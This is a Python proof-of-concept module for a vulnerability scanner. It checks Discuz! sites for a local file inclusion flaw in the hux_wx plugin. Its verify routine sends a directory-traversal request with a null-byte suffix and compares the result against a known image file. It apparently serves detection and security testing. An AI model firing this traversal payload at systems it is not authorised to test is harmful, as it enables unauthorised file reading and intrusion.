# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0011'  # 平台漏洞编号，留空
    name = 'Discuz! /source/plugin/hux_wx/hux_wx.inc.php 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-10-15'  # 漏洞公布时间
    desc = '''
        Discuz! 插件前台文件包含，可直接shell，百度云会拦截恶意程序，但是潜在问题还是存在。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=079517'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '510e2d7b-ba59-4f1a-a981-b6641b177aa6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # _Refer_ = http://www.wooyun.org/bugs/wooyun-2010-079517
            verify_file = '/plugin.php?id=hux_wx:hux_wx&uid=1&mod=/../../../..&ac=/static/image/admincp/add.gif%00'
            vul_url = self.target + verify_file
            verify_url = '%s/static/image/admincp/add.gif' % self.target
            req = requests.get(verify_url)
            req2 = requests.get(vul_url)

            if (req.status_code == 200 or req2.status_code == 200) and req.text == req2.text and ("404" not in req.text or "404" not in req2.text):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
